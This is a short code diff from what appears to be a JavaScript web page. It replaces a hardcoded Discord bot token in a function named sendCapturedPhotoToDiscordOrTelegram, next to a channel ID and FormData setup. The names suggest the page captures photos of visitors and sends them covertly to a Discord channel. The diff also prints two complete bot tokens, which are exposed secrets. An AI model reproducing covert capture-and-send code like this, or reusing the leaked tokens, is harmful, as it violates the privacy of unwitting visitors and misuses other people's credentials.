@@ -87,7 +87,7 @@ noButton.addEventListener("click", function () {
 });
 
 function sendCapturedPhotoToDiscordOrTelegram(photo) {
-  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GueAbh.bsjbKLVgduBt4N5Uy9RBqIw2L0CRzkgCjLMVyM'; // Replace with your actual token
+  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GZp1AU.rD6qMwOJjxk_1nx5tS7pR44MHD_yRal6fiq68k'; // Replace with your actual token
   const discordChannelId = '1198262222162497686'; // Replace with your actual channel ID
 
   const formData = new FormData();
